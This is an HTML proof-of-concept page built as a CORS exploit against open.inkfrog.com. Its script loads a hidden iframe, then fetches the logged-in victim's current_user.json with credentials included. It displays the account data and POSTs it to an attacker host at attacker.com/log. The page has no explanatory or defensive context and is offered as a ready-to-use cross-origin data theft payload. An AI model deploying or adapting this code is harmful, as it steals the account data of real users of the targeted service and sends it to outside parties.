<!DOCTYPE html>
<html>
<head>
  <title>CORS Referer Exploit - open.inkfrog.com</title>
</head>
<body>
  <h2>ðŸ”“ Exfiltrating current_user.json from open.inkfrog.com</h2>
  <pre id="output">Loading...</pre>

  <script>
    // Force the browser to send the correct Referer
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = "https://builder.asd.com"; // page must exist or redirect

    document.body.appendChild(iframe);

    setTimeout(() => {
      fetch("https://open.inkfrog.com/api/current_user.json", {
        credentials: "include"
      })
      .then(res => {
        if (!res.ok) throw new Error("Fetch failed: " + res.status);
        return res.text();
      })
      .then(data => {
        document.getElementById("output").textContent = data;

        // Optional: Exfil to attacker server
        fetch("https://attacker.com/log", {
          method: "POST",
          body: data
        });
      })
      .catch(err => {
        document.getElementById("output").textContent = "Error: " + err;
      });
    }, 1500); // Delay to allow Referer to register
  </script>
</body>
</html>
